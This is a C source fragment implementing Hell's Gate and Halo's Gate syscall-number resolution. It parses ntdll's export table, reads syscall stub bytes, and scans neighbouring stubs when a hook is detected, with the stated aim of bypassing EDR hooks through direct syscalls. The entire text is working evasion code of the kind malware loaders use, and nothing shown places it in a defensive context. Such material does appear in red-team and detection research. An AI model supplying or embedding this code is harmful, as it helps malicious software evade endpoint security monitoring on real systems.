   Mechanism: Walk ntdll export directory, read mov eax,<SSN> byte pattern
              from the syscall stub, then issue 'syscall' directly —
              bypassing any EDR hook placed on the ntdll thunk.
   ========================================================================= */

HELLSGATE_SSN Modern_ResolveSSN(const char *szFuncName) {
    HELLSGATE_SSN result = {0};
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return result;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hNtdll +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *pdwNames   = (DWORD*)((BYTE*)hNtdll + pExp->AddressOfNames);
    DWORD *pdwFuncs   = (DWORD*)((BYTE*)hNtdll + pExp->AddressOfFunctions);
    WORD  *pwOrdinals = (WORD* )((BYTE*)hNtdll + pExp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char *szName = (const char*)((BYTE*)hNtdll + pdwNames[i]);
        if (_stricmp(szName, szFuncName) != 0) continue;

        BYTE *pbStub = (BYTE*)hNtdll + pdwFuncs[pwOrdinals[i]];
        /*
         * Authentic ntdll stub layout (unhooked):
         *   4C 8B D1        mov r10, rcx
         *   B8 xx xx 00 00  mov eax, <SSN>
         *   ...
         * Hooked stub (EDR): first bytes replaced with JMP -> hook.
         * Hell's Gate: if hooked, scan neighboring exports for SSN.
         */
        if (pbStub[0] == 0x4C && pbStub[1] == 0x8B && pbStub[2] == 0xD1 &&
            pbStub[3] == 0xB8 && pbStub[6] == 0x00 && pbStub[7] == 0x00) {
            result.wSystemCall = *(WORD*)(pbStub + 4);
            result.bResolved   = TRUE;
            fprintf(stdout, "[MODERN][HELLSGATE] %s SSN=0x%04X (stub unhooked)\n",
                    szFuncName, result.wSystemCall);
        } else {
            /* Halo's Gate: scan +/- neighbors for intact stubs */
            for (int d = 1; d <= 32; d++) {
                /* Check neighbor down */
                BYTE *pbUp = pbStub - (d * 32);
                if (pbUp[0] == 0x4C && pbUp[1] == 0x8B && pbUp[2] == 0xD1 &&
                    pbUp[3] == 0xB8 && pbUp[6] == 0x00 && pbUp[7] == 0x00) {
                    result.wSystemCall = *(WORD*)(pbUp + 4) + (WORD)d;
                    result.bResolved   = TRUE;
                    fprintf(stdout, "[MODERN][HALOGATE] %s SSN=0x%04X (via neighbor -d=%d)\n",
                            szFuncName, result.wSystemCall, d);
                    break;
                }
                BYTE *pbDown = pbStub + (d * 32);
                if (pbDown[0] == 0x4C && pbDown[1] == 0x8B && pbDown[2] == 0xD1 &&
                    pbDown[3] == 0xB8 && pbDown[6] == 0x00 && pbDown[7] == 0x00) {
                    result.wSystemCall = *(WORD*)(pbDown + 4) - (WORD)d;
                    result.bResolved   = TRUE;
                    fprintf(stdout, "[MODERN][HALOGATE] %s SSN=0x%04X (via neighbor +d=%d)\n",
                            szFuncName, result.wSystemCall, d);
                    break;
                }
            }
        }
        break;
    }
    return result;
}

